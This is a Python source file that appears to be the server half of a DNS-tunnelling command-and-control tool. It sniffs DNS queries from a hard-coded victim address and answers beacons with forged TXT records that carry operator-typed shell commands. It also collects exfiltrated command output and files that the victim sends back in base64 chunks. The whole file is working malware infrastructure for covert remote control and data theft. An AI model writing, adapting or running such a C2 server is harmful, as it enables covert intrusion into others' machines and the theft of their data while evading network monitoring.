
from dns_c2_modules import *

commands_que = {}
opened_fd = ""

# packets = [IP(src="127.0.0.1", dst="192.168.1.1")
#         / UDP(sport=80, dport=53)
#         / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1"))
#     ]

def commands_input():
    global commands_que
    while True:
        if not commands_que:
            words = input("\nEnter type and command (ex: run ls):\n").split ()
            key = words[0]                      #extract the first word as key
            value = ' '.join(words[1:])         # extract all the rest as value
            commands_que = {key: value}   
            print(commands_que)
            
def build_p(packet,data):

    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )
    dns = DNS(
        qd=packet[DNS].qd,rd=0,qr=1,
        an=DNSRR(
            rrname=packet[DNS].qd.qname,
            type='TXT',
            rdata=data)
        )
    response_packet = ip / udp / dns
    return response_packet

def send_command(ip_adr,vic_sport,get_qname,packet):
    global commands_que
    if not commands_que:
        return
    print("commands_que:")
    prefix = next(iter(commands_que))           
    print("prefix is: " + prefix)
    command_name = commands_que[prefix]
    print("command is: " + command_name)
    if prefix == RUN_MODEL:
        prefix = RUN
    elif prefix == SEND_MODEL:
        prefix = FILE
    bin_command = bytes(command_name.encode())
    print(bin_command)
 
    combined = base64.b64encode(prefix) + base64.b64encode(bin_command)
    #pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(qd=DNSQR(qtype="TXT", qname=data_recieved,an=DNSRR(rdata=combined)))
    # pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)
    # send_response(pkt_no_dns,get_qname=get_qname,data=combined)
    print("ip addr!")
    print(ip_adr)
    print(vic_sport)
    built_pkt = build_p(packet,combined)
    send(built_pkt)
    #send(IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(rd=1,qd=DNSQR(qtype="TXT", qname=get_qname,ar=DNSRR(rdata=combined))))
    #pkt_send(pkt_no_data,combined,0)

    commands_que = ""
        
    
def parse_packet(packet):
    global opened_fd
    
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0: 
        print("i am in parse")
        victim_ip = packet[IP].src
        if (victim_ip) != "192.168.1.21":
            return
        print(victim_ip)
        vic_sport = packet[UDP].sport
        get_qname = packet[DNS].qd.qname
        print("print qname:")
        print(get_qname)   # class bytes
        #prefix_packet = check_prefix(base64.b64decode(get_qname))
        prefix_packet = base64.b64decode(get_qname[0]).decode("utf-8")
        print("print qname again:")
        print(get_qname) 
        print("print prefix:")
        print(prefix_packet)
           
        data_recieved = extract_data(get_qname,prefix_packet)                                # only the data(without prefix)
        if prefix_packet == BEACON:
            
            send_command(victim_ip,vic_sport,get_qname,packet)                 # check if there is a command in the queue and send if there is
      
        elif prefix_packet == BEGIN_OUTPUT:           # a packet that tells the server to prepare; name of the command in the data extracted
            opened_fd = open_file(LOG_OUTPUT)
            write_to_file(opened_fd,base64.b64decode(data_recieved))  # write only the name of the command the the output commands log
        
        elif prefix_packet == BEGIN_FILE:             # a packet that tells the server to prepare; name of the file in the data extracted
            file_name = os.path.basename(base64.b64decode(data_recieved))
            opened_fd = open_file(file_name)
            
        elif prefix_packet == IN_TRANSFER:
            write_to_file(opened_fd,base64.b64decode(data_recieved))  # write the content to the opened fd
            
        elif prefix_packet == EF:                     # a packet that tells the server that client has finished transferring
            close_file(opened_fd)
            opened_fd = ""
            print("transer complete")
            
                        
def server_listen():
    sniff_pkt(pfilter="udp and port 53",handler=parse_packet)
    
if __name__=="__main__":
    signal.signal(signal.SIGINT, signal_handler)

    enter_command_thread = threading.Thread(target=commands_input)
    enter_command_thread.start()

    print("start listening")
    server_listen()    # Start sniffing packets





